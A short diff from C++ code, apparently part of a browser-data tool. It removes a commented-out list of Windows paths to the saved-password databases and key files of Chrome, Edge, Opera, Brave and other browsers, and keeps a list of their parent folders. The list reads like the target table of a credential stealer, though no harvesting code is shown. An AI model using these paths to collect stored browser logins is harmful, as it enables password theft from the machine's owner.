@@ -12,24 +12,6 @@
 
 /*				========================= Static Variables =========================				*/
 
-//const std::vector<std::string> Browser::relativePaths = {			// Relative Path to browser(s) data
-//	"/AppData/Local/Google/Chrome/User Data/Default/Login data",
-//	"/AppData/Local/Gogle/Chrome Beta/User Data/Default/Login data",
-//	"/AppData/Local/Chromium/User Data/Default/Login data",
-//	"/AppData/Local/Google/Chrome/User Data/Local State",
-//	"/AppData/Local/Google/Chrome Beta/User Data/Local State",
-//	"/AppData/Local/Chromium/User Data/Local State",
-//	"/AppData/Roaming/Opera Software/Opera Stable/Default/Login data",
-//	"/AppData/Roaming/Opera Software/Opera GX Stable/Default/Login data",
-//	"/AppData/Roaming/Opera Software/Opera Stable/Local State",
-//	"/AppData/Roaming/Opera Software/Opera GX Stable/Local State",
-//	"/AppData/Local/Microsoft/Edge/User Data/Default/Login data",
-//	"/AppData/Local/Microsoft/Edge/User Data/Local State",
-//	"/AppData/Roaming/Mozilla/Firefox/Profiles",
-//	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login data",
-//	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
-//};
-
 
 const std::vector<std::string> Browser::relativePaths = {			// Parent directory of browser(s)
 	"/AppData/Local/Google/Chrome/User Data/",
